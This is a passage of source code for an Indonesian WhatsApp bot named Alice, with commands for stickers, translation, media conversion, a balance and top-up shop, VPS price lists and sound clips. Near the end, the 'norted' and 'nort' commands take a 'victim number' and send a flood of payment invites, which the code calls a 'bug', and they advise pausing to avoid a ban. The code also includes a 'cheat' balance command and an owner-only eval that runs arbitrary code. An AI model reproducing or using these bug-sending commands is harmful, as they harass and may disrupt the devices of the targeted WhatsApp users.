if (!teks) return m.reply(`Cara Penggunaan ${prefix}qc teks`)
const text = `${teks}`
//const username = await alice.getName(m.quoted ? m.quoted.sender : m.sender)
const avatar = await alice.profilePictureUrl( m.quoted ? m.quoted.sender : m.sender,"image").catch(() =>`https://i0.wp.com/telegra.ph/file/134ccbbd0dfc434a910ab.png`)

const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#FFFFFF",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": pushname,
"photo": {
"url": avatar
}
},
"text": text,
"replyMessage": {}
}
 ],
};
axios
.post(
"https://bot.lyo.su/quote/generate",
json,
{
headers: { "Content-Type": "application/json" },
})
.then(async (res) => {
const buffer = Buffer.from(res.data.result.image, "base64");
alice.sendMessage(from,{image: buffer},{quoted : m})
})
}
break
case 's': case 'stiker': case 'sticker': {
if (/image/.test(mime)) {
let media = await alice.downloadAndSaveMediaMessage(quoted, + new Date * 1)
alice.sendImageAsSticker(from, media, fpayment2, {packname: '© 𝙰𝚄𝚃𝙷𝙾𝚁 𝙹𝙾𝙼𝙾𝙺', author: '𝙳𝙰𝚁𝚆𝙸𝙽 𝙱𝙾𝚃'})
await fs.unlinkSync(media)
} else if (/video/.test(mime)) {
if (quoted.seconds > 11) return reply795('Maksimal 10 detik!')
let media = await alice.downloadAndSaveMediaMessage(quoted, + new Date * 1)
alice.sendVideoAsSticker(from, media, fpayment2, {packname: '© 𝙰𝚄𝚃𝙷𝙾𝚁 𝙹𝙾𝙼𝙾𝙺', author: '𝙳𝙰𝚁𝚆𝙸𝙽 𝙱𝙾𝚃'})
await fs.unlinkSync(media)
} else reply795(`Kirim atau reply gambar dengan caption ${prefix+command}`)
}
break
case 'tr':
case 'translate':{
let translate = require('translate-google-api')
let defaultLang = 'en'
let tld = 'cn'
let toks = `
Contoh:
${prefix + command} <lang> [text]
${prefix + command} id your messages
Daftar bahasa yang didukung: https://cloud.google.com/translate/docs/languages
`.trim()

let lang = args[0]
let text = args.slice(1).join(' ')
if ((args[0] || '').length !== 2) {
lang = defaultLang
text = args.join(' ')
}
if (!text && m.quoted && m.quoted.text) text = m.quoted.text
let result
try {
result = await translate(`${text}`, {to: lang})
} catch (e) {
result = await translate(`${text}`, {to: defaultLang,})
reply(toks)
} finally {
reply(result[0])
}
}
break
case 'tovideo':
if (isQuotedSticker) return reply(`Reply stikernya!`);
var stream = await baileys.downloadContentFromMessage(
m.message.extendedTextMessage?.contextInfo.quotedMessage.stickerMessage,"sticker"
);
        var buffer = Buffer.from([]);
        for await (const chunk of stream) {
          buffer = Buffer.concat([buffer, chunk]);
        }
        var rand1 = ".npm/" + getRandom(".webp");
        var rand2 = ".npm/" + getRandom(".png");
        fs.writeFileSync(`./${rand1}`, buffer);
        if (
          isQuotedSticker &&
          m.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage
            .isAnimated !== true
        ) {
          exec(`ffmpeg -i ./${rand1} ./${rand2}`, (err) => {
            fs.unlinkSync(`./${rand1}`);
            if (err) return reply("Status: 0");
            alice.sendMessage(
              from,
              { image: { url: `./${rand2}` } },
              { quoted: m }
            );
            fs.unlinkSync(`./${rand2}`);
          });
        } else {
          reply(mess.wait);
          webp2mp4File(`./${rand1}`).then((data) => {
            fs.unlinkSync(`./${rand1}`);
            alice.sendMessage(
              from,
              { video: { url: data.result } },
              { quoted: m }
            );
          });
        }
        break;
case 'tovn':{
if (!isGroup) return onlyGroup()
if (!/video/.test(mime) && !/audio/.test(mime)) throw `Reply video/audio dengan caption ${prefix + command}`
if (!quoted) throw `Reply video/audio dengan caption ${prefix + command}`
await loading()
var dl = await m.quoted.download()
alice.sendMessage(from, {audio: dl, mimetype: 'audio/mpeg', ptt: true }, {quoted: m })
}
break
case 'toaudio':{
if (!isGroup) return onlyGroup()
if (!/video/.test(mime) && !/audio/.test(mime)) throw `Reply video/audio dengan caption ${prefix + command}`
if (!quoted) throw `Reply video/audio dengan caption ${prefix + command}`
await loading()
var dl = await m.quoted.download()
alice.sendMessage(from, {audio: dl, mimetype: 'audio/mpeg', ptt: false }, {quoted: m })
}
break
case 'tomp3': {
if (!isGroup) return onlyGroup()
if (!/video/.test(mime) && !/audio/.test(mime)) throw `Reply video/audio dengan caption ${prefix + command}`
if (!quoted) throw `Reply video/audio dengan caption ${prefix + command}`
await loading()
var dl = await m.quoted.download()
alice.sendMessage(from, {audio: dl, mimetype:'audio/mpeg', ptt:false, contextInfo:{  externalAdReply: { showAdAttribution: false,
mediaType:  1,
mediaUrl: 'https://youtube.com/@bg-darwin',
title: `Converter mp3`,
sourceUrl: `${global.saluran}`,
thumbnail: ppnyauser
}
}})
}
break
//=================================================//
case 'togif': {
if (!isGroup) return onlyGroup()
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `*reply sticker with caption* *${prefix + command}*`
let { webp2mp4File } = require('./lib/uploader')
let media = await alice.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await alice.sendMessage(from, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, {quoted:m})
await fs.unlinkSync(media)
}
break
//=================================================//
case 'tourl': {
//if (!isGroup) return onlyGroup()
if (!/video/.test(mime) && !/image/.test(mime)) throw `*Send/Reply the Video/Image With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Image Caption* ${prefix + command}`
let media = await alice.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
m.reply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await TelegraPh(media)
m.reply(util.format(anu))
}
await fs.unlinkSync(media)
}
break
case 'toqr':{
if (!q) return reply('Masukin Link Atau Text (´-﹏-`；)')
const QrCode = require('qrcode-reader')
const qrcode = require('qrcode')
let qyuer = await qrcode.toDataURL(q, { scale: 35 })
let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
let buff = getRandom('.jpg')
await fs.writeFileSync('./'+buff, data)
let medi = fs.readFileSync('./' + buff)
await alice.sendMessage(from, { image: medi, caption:"Ini Diahh (￣ヘ￣;)"}, { quoted: m })
setTimeout(() => { fs.unlinkSync(buff) }, 10000)
}
break

















  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
// FITUR SHOP
 /*
            case "nokos-wa-malay", "nokosmalay":{
      //     if (new Date - global.db.users[m.sender].otplast > + 60000) {
       //     user.otplast = new Date * 1
//if (!isPrems) return m.reply('Fitur ini khusus Premium')
if (userz.saldo < nokosmalay) {
  m.reply('Saldo User Anda Kurang!. Silahkan Melakukan Deposit Terlebih Dahulu')
  } else if(userz.saldo > nokosmalay) {
    var res = await fetchJson(`https://otpku.com/api/json.php?api_key=${apikeyotp}&action=order&service=313&operator=any`)
    var ressa = await fetchJson(`https://otpku.com/api/json.php?api_key=${apikeyotp}&action=set_status&id=${ress.id}&status=1`)
    if (res.status == false) return m.reply(res.data.msg)
    await sleep(1000)
    var ress = res.data
    try {
    m.reply(`${htki}*DETAIL ORDER*${htka}
    
    》 id: ${ress.id}
    》 service name: ${ress.service_name}
    》 nokos: ${ress.number}
    》 region : Malaysia
    
    • info selengkapnya
    silahkan ketik .getorder`)
global.db.users[who].saldo -= nokosmalay
    user.otpcancel = new Date * 1
        m.reply(`Anda menggunakan saldo sebesar Rp{nokosmalay}`)
} catch (e) {
    if (res.messages == false) return m.reply('Sedang dalam proses restock, mohon tunggu sebentar.')
    m.reply(`${res.messages}`)
    }
  }
          //  } else m.reply(`Kamu sudah *Mengambil Otp* Saat Ini..\nMohon tunggu ${waktuh} untuk bisa *Mengambil Otp* kembali..`)
}
            break
            case "order":{
     //      if (new Date - global.db.users[m.sender].otplast > + 60000) {
         //       user.otplast = new Date * 1
if (!isROwner) return m.reply('Hadeh lu siape? Owner gw?')
let q = text
if (!q) return m.reply(`id layanannya?`)
var res = await fetchJson(`	https://otpku.com/api/json.php?api_key=${apikeyotp}&action=order&service=${q}&operator=any`)
var ressa = await fetchJson(`https://otpku.com/api/json.php?api_key=${apikeyotp}&action=set_status&id=${q}&status=1`)
if (res.status == false) return m.reply(res.data.msg)
await sleep(1000)
let ress = res.data
m.reply(`${htki}*DETAIL ORDER*${htka}

》 id: ${ress.id}
》 service name: ${ress.service_name}
》 nokos: ${ress.number}
》 category : ${ress.category}

• info selengkapnya
silahkan ketik .getorder`)
                user.otpcancel = new Date * 1
                var ressa = await fetchJson(`https://otpku.com/api/json.php?api_key=${apikeyotp}&action=set_status&id=${ress.id}&status=1`)
       //     } else m.reply(`Kamu sudah *Mengambil Otp* Saat Ini..\nMohon tunggu ${waktuh} untuk bisa *Mengambil Otp* kembali..`)
}
break
case "getorder":{
//if (!isPrems) return m.reply('Fitur ini khusus Premium')
let kode = await fetchJson(`https://otpku.com/api/json.php?api_key=${apikeyotp}&action=active_order`)
if (kode.succes == false) return m.reply(kode.data.msg)
await sleep(1000)
let GG = 0
for (let x of kode.data){
teks =`${htki}STATUS ORDER${htka}

》 id: ${x.id}
》 number : ${x.number}
》 sms otp : ${x.otp}\n\n`
}
// let teks =`*MENGAMBIL OTP*\n\n- ID layanan: ${x.order_id}\n- Nomor: ${x.number}\n- OTP: ${x.sms}\n\n*!Jika Undefined berarti tidak ada otp masuk*`
let cap = teks + '\n\n## *Jika Kosong Tidak ada otp Masuk* ##'
m.reply(cap)
}
break

*/
case 'sendpayment': {
async function dana(aplikasi, nomer, jumlah, tujuan) {
const axios = require('axios');
const fs = require('fs');
    try {
        let response = await axios.get(`https://api.neoxr.eu/api/topup-${aplikasi}`, {
            params: {
                number: nomer,
                amount: jumlah
            }
        });

        let qrImageData = response.data.data.qr_image;
        
        // Dekode data base64 menjadi buffer
        let qrImageBuffer = Buffer.from(qrImageData, 'base64');

        // Simpan buffer sebagai file gambar (opsional)
        fs.writeFileSync('qr_image.png', qrImageBuffer);
        
let paycap = `*TRANSFER SALDO*
Silahkan untuk mekakukan prabayar dengan ${aplikasi} dengan qris di atas, scan qris di atas di aplikasi prabayar kamu

•   ID : ${response.data.data.id}
•   Code : ${response.data.data.code}
•   Number : ${response.data.data.number}
•   Price : ${response.data.data.price_format}
•   Expired : ${response.data.data.expired_at}`

        // Kirim gambar sebagai pesan
        alice.sendMessage(tujuan ? tujuan + `@s.whatsapp.net` : m.chat, { image: qrImageBuffer, caption: paycap }, { quoted: fcall });
    } catch (error) {
        reply('An error occurred while processing your request.');
    }
}

let aplikasi = args[0]
let nomer = args[1]
let jumlah = args[2]
let tujuan = args[3]
if (!aplikasi && !nomer && !jumlah) return reply(`Upss penggunaan salah, ikuti step dibawah\n\nexample : sendpayment dana 62849383893 900000`)
dana(aplikasi, nomer, jumlah, tujuan)
}
break

case 'transfer': case 'tf':{
if (!isGroup) return reply(mess.group)
if (m.quoted) {
if (db.users[froms] == undefined) return reply('User tidak terdaftar didalam database!')
if (froms == sender) return reply('*[ Transfer ]* failed')
if (!args[0]) return reply(`*[ Transfer ]* masukkan nominal nya!`)
if (isNaN(args[0])) return reply(`*[ Transfer ]* nominal harus berupa angka!`)
if (Number(args[0]) >= 9999999999999999) return reply795('Kebanyakan!')
let count = args[0].length > 0 ? Math.min(9999999999999999, Math.max(parseInt(args[0]), 1)) : Math.min(1)
if (count < 100) return reply795('*[ Transfer ]* minimal 100 untuk bisa transfer!')
if (cekSaldo(sender, db_saldo) >= count * 1) {
minSaldo(sender, count * 1, db_saldo)
addSaldo(m.quoted.sender, count * 1, db_saldo)
reply795(`*SUCCESS TRANSFER*\n\n${tag} Sukses transfer saldo sebesar *Rp. ${count}* kepada @${m.quoted.sender.split('@')[0]}`)
} else reply(`Saldo kamu tidak mencukupi untuk mentransfer saldo sebesar ${count}`)
} else if (q) {
let nominalnya = args[0].toString()
let tagnya = q.slice(args[0].length + 1, q.length).replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (!(tagnya in users)) return reply795('User tidak terdaftar didalam database!')
if (tagnya == sender) return reply795('Tidak bisa transfer ke diri sendiri!')
if (!nominalnya) return reply795(`Masukkan nominal nya!`)
if (isNaN(nominalnya)) return reply795(`Nominal harus berupa angka!`)
if (Number(nominalnya) >= 9999999999999999) return reply795('Kebanyakan!')
let count = nominalnya.length > 0 ? Math.min(9999999999999999, Math.max(parseInt(nominalnya), 1)) : Math.min(1)
if (count < 100) return reply795('Minimal 100 untuk bisa transfer!')
if (cekSaldo(sender, db_saldo) >= count * 1) {
minSaldo(sender, count * 1, db_saldo)
addSaldo(tagnya, count * 1, db_saldo)
reply(`*SUCCESS TRANSFER*\n\n${tag} Sukses transfer balance sebesar *$${count}* kepada @${tagnya.split('@')[0]}`)
} else reply(`Balance kamu tidak mencukupi untuk mentransfer balance sebesar ${count}`)
} else reply(`Gunakan dengan cara ${command} *Reply Pesan Nominal*\n\nContoh : Reply Pesan Target ${command} 100`)
}
break
case 'ceksaldo':
if (!froms) return reply(`Mau cek saldo siapa? coba reply atau tag 🤔`)
if (froms == global.owner || froms == botNumber) return reply(`Ups, Saldo ${froms == global.owner ? 'creator saya' : 'bot'} Privasi!`)
if (db.users[froms] == undefined) return reply('User tidak terdaftar didalam database!')
if (froms == sender) return reply('Ketik aja saldo lah')
reply795(`*INFO SALDO DARI*\n\nTarget Cek : ${alice.getName(froms)}\nSaldo : Rp. ${toRupiah(cekSaldo(froms, db_saldo))}\nNomor : ${froms.split('@')[0]}`)
break
case 'saldo':{
const Kalender0001 = moment.tz('Asia/Jakarta').format(`yyyy-MMMM-dddd`)
reply795(`*INFO SALDO ANDA*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Saldo : Rp ${toRupiah(cekSaldo(m.sender, db_saldo))}
 • Tanggal : ${calender}
 
Note : anda hanya bisa melakukan pembelian di bot alice saja, ketik *menu shop* untuk berbelanja`)
}
break
//=================================================//
case 'acc': case 'addsaldo':{
if (!isCreator) return reply(`*[ System Notice ]* User tidak bisa aksess command ini`)
const Kalender000 = moment.tz('Asia/Jakarta').format(`yyyy-MMMM-dddd`)
if (!q.split(",")[0]) return reply(`Ex : ${prefix+command} ${nomore},20000`)
if (!q.split(",")[1]) return reply(`Ex : ${prefix+command} ${nomore},2000`)
addSaldo(q.split(",")[0]+"@s.whatsapp.net", Number(q.split(",")[1]), db_saldo)
await delay(1000)
reply(`*USER SALDO*
 • ID : ${sender.split("@")[0]}
 • Nomor : ${q.split(",")[0]}
 • Tanggal : ${Kalender000}
 • Saldo : Rp ${toRupiah(cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo))} `)
        }
case 'kirim': {
if (!isCreator) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`)
let messageText = `Operasi *Topup* sebanyak Rp. ${q.split(",")[1]} suksess, ketik *.saldo* untuk melihat info anda`
let targetNumber = `${q.split(",")[0]}@s.whatsapp.net`;

alice.sendMessage(targetNumber, {
text: `${messageText}`,
mentions: [sender]
}, {
quoted: m
}).then(() => {
reply('Berhasil ✓');
}).catch(() => {
m.reply('Gagal mengirim pesan!');
});
}
break;
//=================================================//
case 'minsaldo':
if (!isCreator) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`)
if (!q.split(",")[0]) return m.reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 628xxx,20000`)
if (!q.split(",")[1]) return m.reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 628xxx,20000`)
if (cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo) < q.split(",")[1] && cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo) !== 0) return m.reply(`Dia saldonya ${cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo)}, jadi jangan melebihi ${cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo)} yah`)
const Kalender010 = moment.tz('Asia/Jakarta').format(`yyyy-MMMM-dddd`)
minSaldo(q.split(",")[0]+"@s.whatsapp.net", Number(q.split(",")[1]), db_saldo)
reply(`*USER SALDO*
 • ID : ${q.split(",")[0]}
 • Nomor : ${q.split(",")[0]}
 • Tanggal : ${Kalender010}
 • Saldo : Rp ${toRupiah(cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo))}, `)
break
//=================================================//
case 'cekmin':
if (!text) return reply('reply bukti pembayaran anda\n\ncontoh : .cekmin udah topup 40ribu')
if ((!isImage) || !isQuotedImage) {
try {
let media = await quoted.download()
reply('pesan dikirim ke owner, tunggu owner *acc* saldo anda')
await delay(100)
alice.sendMessage(global.owner, { image: media, caption: `${text}`}, { quoted: m})
} catch (err) {
reply(`Gambar tidak di temukan!\nCoba untuk ulangi kirim/reply gambar dengan caption ${prefix+command}`)
}
} else reply(`Kirim/reply gambar dengan caption ${prefix+command}`)
break
case 'cheat':
if (!isCreator&&!isPremium) return reply(mess.owner)
if (args[0] == 'on'){
reply('cheat activated')
addSaldo(sender, 9999999999, db_saldo)
addLevelingXp(sender, 9999999999)
addBalance(sender, 9999999999, balance)
addEmas(sender, 9999999999)
addBesi(sender, 9999999999)
addDm(sender, 9999999999)
addPotion(m.sender, 9999999999)
let datacheat = `*CHEAT INFO*
  • User cheat : ${tag}
  • Saldo : 9999999999
  • Limit : 9999999999
  • Exp : 9999999999
  • Monay : 9999999999
  • Gold : 9999999999
  • Besi : 9999999999
  • Diamond : 9999999999
  • Potion : 9999999999
  `  
reply795(datacheat)
} else if (args[0] == 'off'){
reply('cheat dimatikan, data anda di reset')
let darwings = cekSaldo(sender,db_saldo)
minSaldo(sender, darwings, db_saldo)
} else reply('on / off')
break
case 'topup':
if (isGroup) return reply795(`Silahkan lakukan topup di private chat bot dengan tap link dibawah\n\n[ wa.me/${botNumber.split('@')[0]}?text=topup ]`)
if (!args[0]) return reply(`*[ Topup ]* masukkan nominal nya!`)
if (isNaN(args[0])) return reply(`*[ Topup ]* nominal harus berupa angka!`)
if (Number(args[0]) >= 9999999999999999) return reply795('Kebanyakan!')
let countol = args[0].length > 0 ? Math.min(9999999999999999, Math.max(parseInt(args[0]), 1)) : Math.min(1)
if (countol < 100) return reply795('*[ Topup ]* minimal Rp.1000 untuk bisa topup!')
alice.sendMessage(global.owner, {text: `*REQUEST TOPUP*\n • Nama : ${pushname}\n • Nomor : wa.me/${nomore}\n • Topup : Rp. ${text}`},{quoted: m})
await delay(100)
let mesmes = `*REQUEST TOPUP*\n\n • Nama : ${pushname}\n • Nomor : ${tag}\n • Topup : ${countol}\n • Tanggal : ${calender}\n\n*E-WALET PRABAYAR*\n\n • Dana : *083891170044*\n • Nama : C**U\n\n • ShoppePay : *083891170044*\n • Nama : C**U\n\nLakukan pembayaran ke nomor tersebut dan jika sudah melakukan topup ketik *cekmin* dengan reply foto bukti transaksi anda!`
break
case 'listpanel': case 'beliserver':
let inilistpanel = `*PAKET NORMAL*
_____________________________________
1 GB RAM - 50 CPU • Rp. 1,500
2 GB RAM - 70 CPU • Rp. 2,500
3 GB RAM - 80 CPU • Rp. 3,000
4 GB RAM - 90 CPU • Rp. 4,000

*PAKET MEDIUM*
_____________________________________
5 GB RAM - 100 CPU • Rp. 5,000
6 GB RAM - 120 CPU • Rp. 6,000
7 GB RAM - 140 CPU • Rp. 7,000
8 GB RAM - 150 CPU • Rp. 8,500
9 GB RAM - 180 CPU • Rp. 10,000

*PAKET HIGH*
_____________________________________
UNLIMITED RAM - CPU 0 Rp.15,000

*PROFIT*
server anda aman ✓
bisa claim garansi ✓
anti down server ✓
garansi 2 minggu ✓
_____________________________________

Anda bisa membeli panel dengan saldo\nketik *saldo* untuk melihat saldo anda\n\n*Cara Pembelian*\ncukup ketik ulang ram yang ingin anda beli *contoh* 2GB, maka bot akan melakukan transaksi pembelian secara otomatis`
alice.sendMessage(from, {
document: trash,
fileName: 'Panel Pterodactyl',
mimetype: doc3,
fileLength: 999999999,
pageCount: '2024',
caption: inilistpanel,
contextInfo: {
externalAdReply: {  
title: `PRABAYAR OTOMATIS`, 
body: 'alice project [v.1.4]',
thumbnailUrl: "https://telegra.ph/file/fa753d99143e66c7fcf99.png", 
sourceUrl: `${global.saluran}`,
mediaType: 1,
renderLargerThumbnail: true
}}},{quoted:fgclink})
break
case 'listvps':
let anunyav = `
╾───────────────╼
*• List VPS Linode*
╾───────────────╼
*• Rp 60K*
_› 2 CPU_
_› 80 GB Storage_
_› 4 GB RAM_
╾───────────────╼
*• Rp 90K*
_› 4 CPU_
_› 160 GB Storage_
_› 8 GB RAM_
╾───────────────╼
*• Rp 120K*
_› 8 CPU_
_› 320 GB Storage_
_› 16 GB RAM_
╾───────────────╼
_› Free install pterodactyl_
_› Free nstall wings_
_› Free install tema_
_› Free domain_
_› Free EGG_
╾───────────────╼

_✅WhatsApp : wa.me/${global.owner2}_
_✅Instagram : @bg.darwin_`
alice.sendMessage(from, {
document: trash,
fileName: 'Shop & Pay Pay',
mimetype: doc2,
fileLength: 999999999,
pageCount: '2024',
caption: anunyav,
contextInfo: {
externalAdReply: {  
title: `VPS & DIGITAL OCEAN`, 
body: 'alice project [v.1.4]',
thumbnailUrl: "https://telegra.ph/file/939e4ab598aacf0a7c506.jpg", 
sourceUrl: `${global.saluran}`,
mediaType: 1,
renderLargerThumbnail: true
}}},{quoted: fpayment2})
break









































































// FITUR TEXTPRO

























// FITUR SOUND
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
if (!isGroup) return onlyGroup()
let bangsat = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await alice.sendMessage(from, { audio: bangsat, mimetype: 'audio/mp4', ptt: true, viewOnce: true, contextInfo:{  externalAdReply: { showAdAttribution: false,
mediaType:  2,
mediaUrl: `https://wa.me/${global.owner}`,
title: `${command}`,
sourceUrl: `${global.saluran}`,
thumbnail: ppnyauser,
renderLargerThumbnail: false,
}
}})
break


































case 'menu': case 'alice': case 'command': case 'cmd':
if(!m.isGroup) return !0;
    if (args[0] == 'nsfw'){
    if (!isGroup) return onlyGroup()
    sendres(from,`${menunsfw(prefix)}`)
    } else if (args[0] == 'tools'){
    sendres(from,`${menutools(prefix)}`)
    } else if (args[0] == 'asupan'){
    sendres(from,`${menuasupan(prefix)}`)
    } else if (args[0] == 'photoxy'){
    sendres(from,`${menuphotoxy(prefix)}`)
    sendres(from,menuphotoxy)
    } else if (args[0] == 'jadibot'){
    sendres(from,`${menujadibot(prefix)}`)
    } else if (args[0] == 'textpro'){
    sendres(from,`${menutextpro(prefix)}`)
    } else if (args[0] == 'owner'){
    sendres(from,`${menuowner(prefix)}`)
    } else if (args[0] == 'search'){
    if (!isGroup) return onlyGroup()
    sendres(from,`${menusearch(prefix)}`)
    } else if (args[0] == 'chatbot'){
    sendres(from,`${menuchatbot(prefix)}`)
    } else if (args[0] == 'random'){
    if(!isGroup) return onlyGroup()
    sendres(from,`${menurandom(prefix)}`)
    } else if (args[0] == 'convert'){
    sendres(from,`${menuconvert(prefix)}`)
    } else if (args[0] == 'download'){
    sendres(from,`${menudownload(prefix)}`)
    } else if (args[0] == 'ephoto'){
    if (!isGroup) return onlyGroup()
    sendres(from,`${menuephoto(prefix)}`)
    } else if (args[0] == 'primbon'){
    if (!isGroup) return onlyGroup()
    sendres(from,`${menuprimbon(prefix)}`)
    } else if (args[0] == 'group'){
    if (!isGroup) return onlyGroup()
    sendres(from,`${menugroup(prefix)}`)
    } else if (args[0] == 'anime'){
    sendres(from,`${menuanime(prefix)}`)
    } else if (args[0] == 'rpg'){
    if (!isGroup) return onlyGroup()
    sendres(from,`${menurpg(prefix)}`)
    } else if (args[0] == 'sound'){
    sendres(from,`${menusound(prefix)}`)
    } else if (args[0] == 'audio'){
    sendres(from,`${menuaudio(prefix)}`)
    } else if (args[0] == 'game'){
    sendres(from,`${menugame(prefix)}`)
    } else if (args[0] == 'shop'){
    sendres(from,`${menushop(prefix)}`)
    } else if (args[0] == 'fun'){
    if (!isGroup) return onlyGroup()
    sendres(from,`${menufun(prefix)}`)
    } else if (args[0] == 'all') {
    sendres(from,`${menuutama(prefix, m, sender, command, latensi, isPremium, tag)}`+`${menuchatbot(prefix)}`+`${menugroup(prefix)}`+`${menuowner(prefix)}`+`${menufun(prefix)}`+`${menugame(prefix)}`+`${menurpg(prefix)}`+`${menutools(prefix)}`+`${menuanime(prefix)}`+`${menunsfw(prefix)}`+`${menurandom(prefix)}`+`${menuephoto(prefix)}`+`${menujadibot(prefix)}`+`${menuphotoxy(prefix)}`+`${menutextpro(prefix)}`+`${menuaudio(prefix)}`+`${menusound(prefix)}`)
    } else sendres(from,`${menuutama(prefix, m, sender, command, latensi, isPremium, tag)}`)
break











case "norted": {
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await alice.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6283817421530") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await delay(2000); // Adjusted sleep time for clarity
  sendMultiplePaymentInvites(whatsappNumber, encodedAmount);
  await delay(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "nort":
  {
    if (!text){
      return reply(`Example usage: ${prefix + command} 5`)
      }
    if (isNaN(parseInt(text))) {
      return reply("Amount must be a number");
    }
    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
    reply("please wait, " + command + " bug is in process..");
    await delay(1500); // Adjusted sleep time for clarity
    sendMultiplePaymentInvites(from, encodedValue);
    await delay(2500); // Adjusted sleep time for clarity
  }
  break;
case 'ping': {
const used = process.memoryUsage()
let timestamp = speed()
let latensi = speed() - timestamp
let neww = performance.now()
let oldd = performance.now()
let respon = `*CONNECTION SPEED*
Response Speed : *${latensi.toFixed(4)}* / second

*SERVER INFO*
Ram : ${FileSize(process.memoryUsage().rss)} / ${process.env.SERVER_MEMORY ?? 0} MB

*MEMORY USED*
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}`.trim()
 reply795(respon)
				}
				break
 case 'runtime':{
 reply(`*Alice* active during *${runtime(process.uptime())}*`)
  }
	break
// BATAS AKHIR
default:

if (body.startsWith('>')) {
if(!isCreator) return reply(`*[ System Notice ]* cannot access`)
try {
let evaled = await eval(body.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}
